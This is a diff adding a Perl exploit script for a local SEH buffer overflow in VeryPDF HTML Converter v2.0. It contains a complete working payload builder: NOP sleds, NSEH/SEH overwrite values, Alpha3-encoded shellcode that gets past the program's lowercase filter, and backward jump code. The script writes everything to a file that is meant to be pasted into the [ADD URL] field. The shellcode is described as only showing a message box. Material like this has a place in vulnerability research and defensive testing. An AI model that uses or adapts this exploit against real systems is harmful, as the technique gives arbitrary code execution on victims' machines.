@@ -1,0 +1,66 @@
+#*************************************************************************************************************
+# 
+# Exploit Title: VeryPDF HTML Converter v2.0 SEH/ToLower() Bypass Buffer Overflow
+# Date: 9-6-2015
+# Target tested: Windows 7 (x86/x64)
+# Software Link: http://www.verypdf.com/htmltools/winhtmltools.exe
+# Exploit Author: Robbie Corley
+# Contact: c0d3rc0rl3y@gmail.com
+# Website: 
+# CVE: 
+# Category: Local Exploit
+#
+# Description:
+# The [ADD URL] feature is vulnerable to an SEH based buffer overflow.  
+# This can be exploited by constructing a payload of ascii characters that contain our payload
+# and pasting it into the textbox.  The program's textbox converts ALL pasted data to lowercase so I
+# took advantage of the wonderful Alpha3 tool to encode the shellcode into a numerical format to bypass the filter.
+# 
+# I also used a null terminated SEH address to gain universal exploitation across all current Windows OSes.
+# So, I took a rather unconventional approach and placed the shellcode in the buffer itself since it could
+# not execute after the buffer (after SEH) due to the null byte cutting off the remaining pieces of the string.
+#
+# Instructions:  
+# Run this exploit as-is, open the created 'sploitit.txt' file, copy and paste into the [ADD URL] textbox 
+# Hit [OK] and enjoy your soon-to-follow messagebox!
+#
+#**************************************************************************************************************
+
+# placing shellcode in top of buffer padding since we have a null terminated string
+$zero = pack("C*", 0xD);
+my $buff = "\x90" x 2700; #NSEH is at 3704.  we start low to give room for everything else.
+my $seh = "\x05\x25\x40".$zero;
+$nseh = "\xeb\xe1\x90\x90";  # jump backwards to shellcode ;)
+$filler="\x90" x 122;
+
+#0018E924   66:05 9903       ADD AX,399
+#0018E928   04 29            ADD AX,29
+#0018E92A   04 03            ADD AX,3
+#10 bytes
+$encodersetup="\x66\x05\x99\x03\x04\x24\x04\x10";
+$encodersetup .= "\x8b\xc8";
+
+#python ALPHA3.py x86 lowercase ECX --input="c:\shellmsg.bin"
+#Windows MessageBox contructed using Metasploit & Alpha3
+#637 bytes
+$shellcode=
+"j314d34djq34djk34d1411q11q7j314d34dj234dkmq502dq5o0d15upj98xmfod68kfnen488m56kj4".
+"0ek53knd00192g0dl428l0okn5503cnk6b5bm844nb4k5x70o0mkoc60l9l03c3fje7embj4k9lx1x9k".
+"10j2j2ngne63og74ob708do87cm3jxm9o3j05x0k628x50910b8e5049o84e01oxk39d5841k8jej8kk".
+"nxo4ogo5l07129215f7f3fo0989459kxnb2b78jg5gn8m4l21e6g823x5x680c4b91n0ox1370n0l1l4".
+"10jfmk941b9f1k09n57g281gk414nb4kle92542994293e1dnf224e7b920g0b7go3735cm87f0d4c8f".
+"9d1d3c3b24obn8ob498k1d0e7bke846elc507594jb2xjb9e6d3g8b7gl9459819jclb5b9bjg1cn935".
+"6x7x8x7844oe231809742494ndo43d040cn13fmb43k0611f0952kk3g32l54fkd0b6xm15xjkj3636k".
+"nb9e1dj2n16e3b9565lk6f2bmb7b5e0c0d29l13ekbk94842kd51n17d327000803223ncm9101gl";
+
+$smallpads = "\x90" x 347; 
+
+##section 2 | total 10 bytes
+##Perform a long jump backwards up the stack to reach our payload ;)
+$jumpcode="\x8B\xC1\x90\x90"; #MOV EAX,ECX
+$jumpcode .= "\x66\x05\x55\x05"; # ADD AX,555 --> We do AX so we don't have to worry about NULLS ;)
+$jumpcode .= "\xFF\xe0"; #JMP EAX
+
+open(myfile,'>sploitit.txt');
+print myfile $buff.$encodersetup.$shellcode.$smallpads.$jumpcode.$nseh.$seh;
+close (myfile);
